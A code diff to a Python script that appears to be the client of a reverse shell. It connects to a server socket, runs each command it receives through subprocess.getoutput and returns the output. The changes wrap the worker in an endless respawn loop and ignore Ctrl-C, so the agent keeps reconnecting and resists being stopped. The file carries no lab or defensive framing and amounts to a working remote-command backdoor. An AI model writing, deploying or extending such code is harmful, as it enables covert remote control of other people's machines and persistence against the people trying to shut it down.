@@ -1,6 +1,7 @@
-import socket 
-import subprocess
 import time
+import socket 
+import threading
+import subprocess
 
 SERVER_HOST = "127.0.0.1"
 SERVER_PORT = 5050
@@ -26,13 +27,23 @@ def worker():
     # Get new commands
     while True:
         command = s.recv(BUFFER_SIZE).decode()
-        if command.lower() == "exit":
+        if command.lower() == "exit" or len(command) == 0:
             break
 
         output = subprocess.getoutput(command)
         s.send(output.encode())
 
+    print("Connection Closed")
     s.close()
 
 if __name__ == '__main__':
-    worker()
+    while True:
+        try:
+            print("Creating new worker...")
+            t = threading.Thread(target=worker)
+            t.start()
+            t.join()
+            print("Worker terminated\n")
+        except KeyboardInterrupt:
+            print("SIGINT received")
+            continue
